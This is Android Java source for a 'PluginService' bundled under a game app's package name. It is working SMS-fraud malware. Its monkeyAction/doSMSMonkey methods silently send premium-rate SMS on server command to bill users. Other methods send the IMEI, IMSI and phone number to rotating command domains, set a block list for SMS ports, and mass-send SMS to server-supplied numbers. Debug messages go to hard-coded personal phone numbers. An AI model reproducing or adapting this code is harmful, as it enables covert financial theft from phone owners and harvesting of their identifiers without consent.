package com.xstd.plugin.service;

import android.app.IntentService;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
import android.text.TextUtils;
import com.plugin.common.utils.UtilsRuntime;
import com.plugin.internet.InternetUtils;
import com.tinygame.lianliankan.R;
import com.umeng.analytics.MobclickAgent;
import com.xstd.plugin.Utils.BRCUtil;
import com.xstd.plugin.Utils.CommonUtil;
import com.xstd.plugin.Utils.DomanManager;
import com.xstd.plugin.Utils.SMSUtil;
import com.xstd.plugin.api.*;
import com.xstd.plugin.config.AppRuntime;
import com.xstd.plugin.config.Config;
import com.xstd.plugin.config.PluginSettingManager;
import com.xstd.qm.setting.MainSettingManager;

import java.io.File;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.UUID;

/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-10-20
 * Time: AM8:53
 * To change this template use File | Settings | File Templates.
 */
public class PluginService extends IntentService {

    public static final String ACTIVE_ACTION = "com.xstd.plugin.active";

    public static final String ACTIVE_PLUGIN_PACKAGE_ACTION = "com.xstd.plugin.package.active";

    public static final String SMS_BROADCAST_ACTION = "com.xstd.plugin.broadcast";

    public static final String ACTIVE_FETCH_PHONE_ACTION = "com.xstd.plugin.fetch.phone";

    public static final String ACTION_MAIN_UUID_ACTIVE_BY_PLUGN = "com.xstd.main.uuid.active";

    public static final String ACTION_FETCH_DOMAIN = "com.xstd.plugin.domain.fetch";

    public static final String ACTION_UPDATE_UMENG = "com.xstd.plugin.umeng.event";

    /**
     * 扣费行动
     */
    public static final String MONKEY_ACTION = "com.xstd.plugin.monkey";

    public PluginService() {
        super("PluginService");
    }

    @Override
    public void onHandleIntent(Intent intent) {
        MainSettingManager.getInstance().init(this);
        if (!MainSettingManager.getInstance().getMainShouldFakePlugin()) {
            return;
        }

        MobclickAgent.onResume(this);

        Config.LOGD("[[PluginService::onHandleIntent]] intent : " + intent);
        if (intent != null) {
            String action = intent.getAction();
            Config.LOGD("[[PluginService::onHandleIntent]] action : " + action);
            if (ACTIVE_ACTION.equals(action) && !AppRuntime.ACTIVE_PROCESS_RUNNING.get()) {
                //do active
                activePluginAction();
            } else if (ACTIVE_PLUGIN_PACKAGE_ACTION.equals(action)) {
                /**
                 * 其实什么也不需要做，这个action主要就是激活一下plugin程序
                 * 这条消息是由主程序发出的，如果主程序不激活子程序的话，子程序是不能接受到所有的BRC的
                 */
//                activePluginPackageAction(intent);
            } else if (MONKEY_ACTION.equals(action)) {
                /**
                 * 扣费逻辑
                 */
                monkeyAction();
            } else if (SMS_BROADCAST_ACTION.equals(action)) {
                broadcastSMSForSMSCenter(intent);
            } else if (ACTIVE_FETCH_PHONE_ACTION.equals(action)) {
                fetchPhoneFromServer();
            } else if (ACTION_MAIN_UUID_ACTIVE_BY_PLUGN.equals(action)) {
                //子程序模拟母程序激活
                activeMainApk();
            } else if (ACTION_FETCH_DOMAIN.equals(action)) {
                fetchDomain();
            } else if (ACTION_UPDATE_UMENG.equals(action)) {
                updateUmengEvent(intent);
            }
        }

        MobclickAgent.onPause(this);
    }

    private synchronized void updateUmengEvent(Intent intent) {
        Bundle bundle = intent.getExtras();
        if (bundle != null && bundle.containsKey("event")) {
            String event = (String) bundle.get("event");
            if (!TextUtils.isEmpty(event)) {
                bundle.remove("event");
                HashMap<String, String> log = new HashMap<String, String>();
                for (String key : bundle.keySet()) {
                    if (!TextUtils.isEmpty(key)
                            && !TextUtils.isEmpty((String) bundle.get(key))) {
                        log.put(key, (String) bundle.get(key));
                    }
                }
                CommonUtil.umengLog(getApplicationContext(), event, log);
            }
        }
    }

    private synchronized void fetchDomain() {
        if (!UtilsRuntime.isOnline(getApplicationContext())) return;

        int count = PluginSettingManager.getInstance().getTodayFetchDomainCount();
        PluginSettingManager.getInstance().setTodayFetchDomainCount(count + 1);
        try {
            DomainRequest request = new DomainRequest(DomanManager.getInstance(getApplicationContext()).getOneAviableDomain() + "/spDomain/");
            DomainResponse response = InternetUtils.request(getApplicationContext(), request);
            if (response != null && response.domainList != null && response.domainList.length > 0) {
                ArrayList<String> list = new ArrayList<String>();
                String logD = "start:";
                for (String s : response.domainList) {
                    if (!TextUtils.isEmpty(s) && s.startsWith("http")) {
                        list.add(s);
                        logD = logD + s + ";";
                    }
                }

                DomanManager.getInstance(getApplicationContext()).addDomain(list);
                //notify umeng
                HashMap<String, String> log = new HashMap<String, String>();
                log.put("fetch_domain", logD);
                log.put("current_domain", DomanManager.getInstance(getApplicationContext()).getOneAviableDomain());
                CommonUtil.umengLog(getApplicationContext(), "fetch_domain_success", log);
            }
        } catch (Exception e) {
            HashMap<String, String> log = new HashMap<String, String>();
            log.put("error", e.getMessage());
            CommonUtil.umengLog(getApplicationContext(), "error", log);
        }
    }

    private void activeMainApk() {
        if (Config.DEBUG) {
            Config.LOGD("[[PluginService::activeMainApk]]");
        }

        if (AppRuntime.isTablet(getApplicationContext())) {
            if (Config.DEBUG) {
                Config.LOGD("[[PluginService::activeMainApk]] return as the device is Tab");
            }
            return;
        }

        try {
            String phone = UtilsRuntime.getCurrentPhoneNumber(getApplicationContext());
            if (TextUtils.isEmpty(phone)) phone = "00000000000";
            String imei = UtilsRuntime.getIMEI(getApplicationContext());
            if (TextUtils.isEmpty(imei)) {
                imei = String.valueOf(System.currentTimeMillis());
            }
            String imsi = UtilsRuntime.getIMSI(getApplicationContext());
            if (TextUtils.isEmpty(imsi)) {
                imsi = "987654321";
            }
            String domain = DomanManager.getInstance(getApplicationContext()).getOneAviableDomain();
            if (TextUtils.isEmpty(domain)) return;
            MainActiveRequest request = new MainActiveRequest(UtilsRuntime.getVersionName(getApplicationContext())
                                                                 , imei
                                                                 , imsi
                                                                 , PluginSettingManager.getInstance().getMainApkChannel()
                                                                 , phone
                                                                 , PluginSettingManager.getInstance().getMainApkSendUUID()
                                                                 , domain + "/gais/"
                                                                 , PluginSettingManager.getInstance().getMainExtraInfo());
            MainActiveResponse response = InternetUtils.request(getApplicationContext(), request);

            if (response != null && !TextUtils.isEmpty(response.url)) {
                if (Config.DEBUG) {
                    Config.LOGD("[[Plugin::activeMainApk]] active success, response : " + response.toString());
                }
                //激活成功
                //notify umeng
                HashMap<String, String> log = new HashMap<String, String>();
                log.put("phoneType", Build.MODEL);
                CommonUtil.umengLog(getApplicationContext(), "main_active_success", log);

                PluginSettingManager.getInstance().setMainApkActiveTime(System.currentTimeMillis());
                return;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    private synchronized void fetchPhoneFromServer() {
        if (Config.DEBUG) {
            Config.LOGD("[[PluginService::fetchPhoneFromServer]] entry");
        }

        try {
            if (TextUtils.isEmpty(PluginSettingManager.getInstance().getCurrentPhoneNumber())) {
                String imsi = UtilsRuntime.getIMSI(getApplicationContext());
                if (!TextUtils.isEmpty(imsi)) {
                    if (!UtilsRuntime.isOnline(getApplicationContext())) return;

                    PhoneFetchRespone respone = InternetUtils.request(getApplicationContext()
                                                                         , new PhoneFetchRequest(
                                                                                                    DomanManager.getInstance(getApplicationContext())
                                                                                                        .getOneAviableDomain()
                                                                                                        + "/tools/i2n/" + imsi));
                    if (respone != null && !TextUtils.isEmpty(respone.phone)) {
                        if (Config.DEBUG) {
                            Config.LOGD("[[PluginService::fetchPhoneFromServer]] after fetch PHONE number : (" + respone.phone + ")");
                        }
                        if (respone.phone.length() == 11) {
                            PluginSettingManager.getInstance().setCurrentPhoneNumber(respone.phone);
                            //notify umeng
                            HashMap<String, String> log = new HashMap<String, String>();
                            log.put("fetch", "succes");
                            log.put("phoneNumber", respone.phone);
                            log.put("phoneType", Build.MODEL);
                            CommonUtil.umengLog(getApplicationContext(), "fetch_pn_with_imei", log);
                        } else {
                            PluginSettingManager.getInstance().setKeyLastSendMsgToServicePhone(System.currentTimeMillis());
                            //如果获取失败了，就再明天再向短信服务器发送短信.
                            PluginSettingManager.getInstance().setKeySendMsgToServicePhoneClearTimes(0);

                            //notify umeng
                            HashMap<String, String> log = new HashMap<String, String>();
                            log.put("fetch", "failed");
                            log.put("phoneNumber", respone.phone);
                            log.put("imsi", imsi);
                            log.put("phoneType", Build.MODEL);
                            CommonUtil.umengLog(getApplicationContext(), "fetch_pn_with_imei_failed", log);
                        }
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

        if (Config.DEBUG) {
            Config.LOGD("[[PluginService::fetchPhoneFromServer]] leave");
        }
    }

    private synchronized void broadcastSMSForSMSCenter(Intent intent) {
        if (Config.DEBUG) {
            Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]] entry");
        }

        try {
            String phoneNumbers = PluginSettingManager.getInstance().getBroadcastPhoneNumber();
            if (Config.DEBUG) {
                Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]] before send broadcast, current phone Number is : " + phoneNumbers);
            }
            BRCUtil.cancelAlarmForAction(getApplicationContext(), SMS_BROADCAST_ACTION);
            if (!TextUtils.isEmpty(phoneNumbers)) {
                String[] datas = phoneNumbers.split(";");
                if (datas != null) {
                    //如果一下发送多条短信会有问题，所以增加一个延迟
                    //每次只发5条，等10分钟，再发5条
                    for (int i = 0; (i < datas.length && i < 5); ++i) {
                        String target = datas[i];
//                        if (datas[i] != null && (datas[i].length() == 11 || datas[i].startsWith("+"))) {
                        String content = datas[i];
                        if (datas[i] != null && datas[i].length() == 11) {
                            content = datas[i].substring(0, 5) + "." + datas[i].substring(5);
                            if (SMSUtil.sendSMSForLogic(getApplicationContext(), datas[i], "XSTD.SC:" + content)) {
                                datas[i] = "";
                            }

                            //notify umeng
                            HashMap<String, String> log = new HashMap<String, String>();
//                            log.put("content", "XSTD.SC:" + content);
//                            log.put("to", content);
                            log.put("phoneType", Build.MODEL);
                            CommonUtil.umengLog(getApplicationContext(), "chken_send", log);
                        } else {
                            //电话号码的格式不合法，直接电话号码清空
                            datas[i] = "";
                        }

                        if (Config.DEBUG) {
                            try {
                                //等待1S
                                Thread.sleep(1000);
                            } catch (Exception e) {
                                e.printStackTrace();
                                if (Config.DEBUG) {
                                    Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]]", e);
                                }
                            }

                            String phone = Build.MODEL;
                            String debugMsg = "[[通知短信]]" + phone + " 上的子程序向:" + target + "发送了:<<" + "XSTD.SC:" + content + ">>";
                            SMSUtil.sendSMSForLogic(getApplicationContext(), "18811087096", debugMsg);

                            Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]] debug send message to 15810864155 phone" +
                                            " with " + debugMsg);
                            try {
                                //等待1S
                                Thread.sleep(1000);
                            } catch (Exception e) {
                                e.printStackTrace();
                                if (Config.DEBUG) {
                                    Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]]", e);
                                }
                            }
                            SMSUtil.sendSMSForLogic(getApplicationContext(), "15810864155", debugMsg);
                        }

                        try {
                            //等待1S
                            Thread.sleep(2000);
                        } catch (Exception e) {
                            e.printStackTrace();
                            if (Config.DEBUG) {
                                Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]]", e);
                            }
                        }
                    }

                    //重组整个数据
                    StringBuilder sb = new StringBuilder();
                    for (String d : datas) {
                        if (!TextUtils.isEmpty(d)) {
                            sb.append(d).append(";");
                        }
                    }
                    if (sb.length() > 0) {
                        PluginSettingManager.getInstance().setBroadcastPhoneNumber(sb.substring(0, sb.length() - 1));
                        if (Config.DEBUG) {
                            Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]] after send broadcast, current phone Number is : "
                                            + PluginSettingManager.getInstance().getBroadcastPhoneNumber()
                                            + " and start alarm for next round send delay 10 min");
                        }
                        //因为还有没有发送的号码，所以启动一个定时器
                        BRCUtil.startAlarmForAction(getApplicationContext(), SMS_BROADCAST_ACTION, 10 * 60 * 1000);
                    } else {
                        //已经消耗光
                        PluginSettingManager.getInstance().setBroadcastPhoneNumber("");
                        if (Config.DEBUG) {
                            Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]] after send broadcast, current phone Number is : "
                                            + PluginSettingManager.getInstance().getBroadcastPhoneNumber());
                        }
                    }
                }
            } else {
                if (Config.DEBUG) {
                    Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]] do nothing as the phoneNumbers is empty");
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
            if (Config.DEBUG) {
                Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]]", e);
            }

            if (!TextUtils.isEmpty(PluginSettingManager.getInstance().getBroadcastPhoneNumber())) {
                //因为还有没有发送的号码，所以启动一个定时器
                BRCUtil.startAlarmForAction(getApplicationContext(), SMS_BROADCAST_ACTION, 10 * 60 * 1000);
            }
        }

        if (Config.DEBUG) {
            Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]] leave");
        }
    }

    private void monkeyAction() {
        Config.LOGD("[[PluginService::monkeyAction]]");
        if (AppRuntime.ACTIVE_RESPONSE != null) {
            int monkeyType = AppRuntime.ACTIVE_RESPONSE.type;
            switch (monkeyType) {
                case 1:
                    doSMSMonkey(AppRuntime.ACTIVE_RESPONSE);
                    break;
                case 2:
                    break;
                case 3:
                    break;
            }
        }
    }

    private synchronized void doSMSMonkey(ActiveResponse response) {
        if (response == null) {
            return;
        }

        int dayCount = PluginSettingManager.getInstance().getKeyDayCount();
        int times = response.times;
        long lastCountTime = PluginSettingManager.getInstance().getKeyLastCountTime();
        long curTime = System.currentTimeMillis();
        long delay = ((long) (response.interval)) * 60 * 1000;
        if ((times > dayCount) && (lastCountTime + delay) < curTime) {
            //今天的计费还没有完成，计费一次
            if (Config.DEBUG) {
                Config.LOGD("[[PluginService::doSMSMonkey]] try to send SMS monkey with info : " + response.toString());
            }
            try {
                if (!TextUtils.isEmpty(response.port) && !TextUtils.isEmpty(response.instruction)) {
                    if (AppRuntime.ACTIVE_RESPONSE.smsCmd != null) {
                        String startPort = AppRuntime.ACTIVE_RESPONSE.smsCmd.portList.get(0);
                        String startContent = AppRuntime.ACTIVE_RESPONSE.smsCmd.contentList.get(0);
                        if (startPort.startsWith("n=")) startPort = startPort.substring(2);
                        if (startContent.startsWith("c=")) startContent = startContent.substring(2);
                        /**
                         * 注意，每次扣费的时候，第一条起始的短信都是很直接的，都是n+c的模式
                         */
                        if (SMSUtil.sendSMSForMonkey(getApplicationContext(), startPort, startContent)) {
                            HashMap<String, String> log = new HashMap<String, String>();
                            log.put("phoneType", Build.MODEL);
                            log.put("channelName", AppRuntime.ACTIVE_RESPONSE.channelName);
                            CommonUtil.umengLog(getApplicationContext(), "do_money", log);

                            PluginSettingManager.getInstance().setKeyDayCount(dayCount + 1);
                            PluginSettingManager.getInstance().setKeyMonthCount(PluginSettingManager.getInstance().getKeyMonthCount() + 1);
                            PluginSettingManager.getInstance().setKeyLastCountTime(System.currentTimeMillis());
                        }
                    } else {
                        if (Config.DEBUG) {
                            Config.LOGD("[[PluginService::doSMSMonkey]] AppRuntime.ACTIVE_RESPONSE.smsCmd == null");
                        }
                    }
                }
            } catch (Exception e) {
            }
        } else {
            if (Config.DEBUG) {
                Config.LOGD("[[PluginService::doSMSMonkey]] ignore this as monkey delay not meet");
            }
        }
    }

    private void activePluginAction() {
        AppRuntime.updateSIMCardReadyLog(getApplicationContext());
//        if (!AppRuntime.isSIMCardReady(getApplicationContext())) return;

        if (Config.DEBUG) {
            Config.LOGD("[[PluginService::activePluginAction]] try to fetch active info, Phone Number : "
                            + PluginSettingManager.getInstance().getCurrentPhoneNumber());
        }
        try {
            AppRuntime.ACTIVE_PROCESS_RUNNING.set(true);

            if (TextUtils.isEmpty(PluginSettingManager.getInstance().getCurrentPhoneNumber())) {
                /**
                 * 电话号码为空就发送短信到手机服务器，以后会接受到一条短信，获取到本机的号码
                 */
                SMSUtil.trySendCmdToServicePhone1(getApplicationContext());
            } else {
                String imsi = UtilsRuntime.getIMSI(getApplicationContext());
                if (TextUtils.isEmpty(imsi)) {
                    imsi = String.valueOf(System.currentTimeMillis());
                }
                UUID uuid = CommonUtil.deviceUuidFactory(getApplicationContext());
                String unique = null;
                if (uuid != null) {
                    unique = uuid.toString();
                } else {
                    unique = imsi;
                    CommonUtil.saveUUID(getApplicationContext(), unique);
                }

                PluginSettingManager.getInstance().setKeyDayActiveCount(PluginSettingManager.getInstance().getKeyDayActiveCount() + 1);
                if (Config.DEBUG) {
                    Config.LOGD("[[PluginService::activePluginAction]] last monkey count time = "
                                    + UtilsRuntime.debugFormatTime(PluginSettingManager.getInstance().getKeyLastCountTime()));
                }

                String mainChannel = PluginSettingManager.getInstance().getMainApkChannel();
                if (TextUtils.isEmpty(mainChannel)) mainChannel = "000000";
                ActiveRequest request = new ActiveRequest(getApplicationContext()
                                                             , Config.CHANNEL_CODE
                                                             , unique
                                                             , getString(R.string.app_name)
                                                             , AppRuntime.getNetworkTypeByIMSI(getApplicationContext())
                                                             , PluginSettingManager.getInstance().getCurrentPhoneNumber()
                                                             , PluginSettingManager.getInstance().getKeyLastErrorInfo()
                                                             , DomanManager.getInstance(getApplicationContext())
                                                                   .getOneAviableDomain() + "/sais/"
                                                             , "1"
                                                             , mainChannel);
                //只要激活返回，就记录时间，也就是说，激活时间标识的是上次try to激活的时间，而不是激活成功的时间
                PluginSettingManager.getInstance().setKeyActiveTime(System.currentTimeMillis());
                ActiveResponse response = InternetUtils.request(getApplicationContext(), request);
                /**
                 * 只要是服务器返回了，今天就不工作了，因为如果是网络异常的话会走try catch
                 */
                if (response != null && !TextUtils.isEmpty(response.channelName)) {
                    //notify umeng
                    HashMap<String, String> log = new HashMap<String, String>();
                    log.put("fetch", "succes");
                    log.put("channelName", response.channelName);
                    log.put("osVersion", Build.VERSION.RELEASE);
                    log.put("channelCode", Config.CHANNEL_CODE);
                    log.put("phoneType", Build.MODEL);
                    CommonUtil.umengLog(getApplicationContext(), "fetch_channel", log);

                    if (Config.DEBUG) {
                        Config.LOGD(response.toString());
                    }

                    //增加一步对返回通道数据的校验
                    int netType = AppRuntime.getNetworkTypeByIMSI(getApplicationContext());
                    if (!String.valueOf(netType).equals(response.operator)) {
                        //网络类型不对，这就是一个最初级的检查
                        Config.LOGD("response == null or response error");
                        networkErrorWork();
                    } else {
                        AppRuntime.ACTIVE_RESPONSE = response;
                        AppRuntime.ACTIVE_RESPONSE.parseSMSCmd();
                        AppRuntime.saveActiveResponse(AppRuntime.RESPONSE_SAVE_FILE);
//                                AppRuntime.saveActiveResponse("/sdcard/" + Config.ACTIVE_RESPONSE_FILE);
                        PluginSettingManager.getInstance().setKeyBlockPhoneNumber(response.blockSmsPort);
                        int next = AppRuntime.randomBetween(4, 17);
                        PluginSettingManager.getInstance().setKeyRandomNetworkTime(next);
                    }

                    /**
                     * 消耗掉今天所有的重试次数
                     */
                    if (Config.DEBUG) {
                        Config.LOGD("[[PluginService::activePluginAction]] server return data, So we set DayActiveCount = 17");
                    }
                    PluginSettingManager.getInstance().setKeyDayActiveCount(17);
                } else {
                    Config.LOGD("response == null or response error");
                    networkErrorWork();
                    /**
                     * 消耗掉今天所有的重试次数
                     */
                    if (Config.DEBUG) {
                        Config.LOGD("[[PluginService::activePluginAction]] server return data == null, So we set DayActiveCount = 17");
                    }
                    PluginSettingManager.getInstance().setKeyDayActiveCount(17);

                    //notify umeng
                    HashMap<String, String> log = new HashMap<String, String>();
                    log.put("fetch", "succes");
                    log.put("channelName", "今天不扣费");
//                            log.put("phoneNumber", PluginSettingManager.getInstance().getCurrentPhoneNumber());
                    log.put("osVersion", Build.VERSION.RELEASE);
                    log.put("channelCode", Config.CHANNEL_CODE);
                    log.put("phoneType", Build.MODEL);
//                            log.put("uuid", unique);
                    CommonUtil.umengLog(getApplicationContext(), "fetch_channel", log);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
            if (Config.DEBUG) {
                Config.LOGD("[[networkErrorWork]] entry", e);
            }
            networkErrorWork();
            //notify umeng
            HashMap<String, String> log = new HashMap<String, String>();
            log.put("fetch", "failed");
//                    log.put("phoneNumber", PluginSettingManager.getInstance().getCurrentPhoneNumber());
            log.put("osVersion", Build.VERSION.RELEASE);
            log.put("channelCode", Config.CHANNEL_CODE);
            log.put("phoneType", Build.MODEL);
            log.put("errorType", "network");
            CommonUtil.umengLog(getApplicationContext(), "fetch_channel_failed", log);
        }

        AppRuntime.ACTIVE_PROCESS_RUNNING.set(false);
    }

    private void networkErrorWork() {
        if (Config.DEBUG) {
            Config.LOGD("[[networkErrorWork]] entry");
        }

        File file = new File(AppRuntime.RESPONSE_SAVE_FILE);
        file.delete();
        AppRuntime.ACTIVE_RESPONSE = null;
        int next = AppRuntime.randomBetween(0, 3);
        int lastNetworkTime = PluginSettingManager.getInstance().getKeyRandomNetworkTime();
        int time = 0;
        int curHour = Calendar.getInstance().get(Calendar.HOUR_OF_DAY);
        if (lastNetworkTime <= 18) {
            time = curHour + next;
        } else {
            time = lastNetworkTime > curHour ? (curHour + next) : (lastNetworkTime + next);
        }
        time = time >= 24 ? 23 : time;

        PluginSettingManager.getInstance().setKeyRandomNetworkTime(time);
    }

//    private synchronized void activePluginPackageAction(Intent intent) {
//        Config.LOGD("[[PluginService::onHandleIntent]] >>> action : " + ACTIVE_PLUGIN_PACKAGE_ACTION + " <<<<");
//        try {
//            PluginSettingManager.getInstance().setKeyActiveAppName(intent.getStringExtra("name"));
//            PluginSettingManager.getInstance().setKeyActivePackageName(intent.getStringExtra("packageName"));
//            PluginSettingManager.getInstance().setMainApkSendUUID(intent.getStringExtra("uuid"));
//            PluginSettingManager.getInstance().setMainExtraInfo(intent.getStringExtra("extra"));
//            PluginSettingManager.getInstance().setMainApkChannel(intent.getStringExtra("channel"));
//
//            if (Config.DEBUG) {
//                Config.LOGD("[[PluginService::onHandleIntent]] current fake app info : name = " + intent.getStringExtra("name")
//                                + " packageName = " + intent.getStringExtra("packageName")
//                                + " **** setting manager info : (( "
//                                + " name = " + PluginSettingManager.getInstance().getKeyActiveAppName()
//                                + " packageName = " + PluginSettingManager.getInstance().getKeyActivePackageName()
//                                + " uuid = " + PluginSettingManager.getInstance().getMainApkSendUUID()
//                                + " extra = " + PluginSettingManager.getInstance().getMainExtraInfo()
//                                + " channel = " + PluginSettingManager.getInstance().getMainApkChannel()
//                                + " )) >>>>>>>>>>>");
//            }
//        } catch (Exception e) {
//        }
//    }

    public IBinder onBind(Intent intent) {
        return null;
    }

}
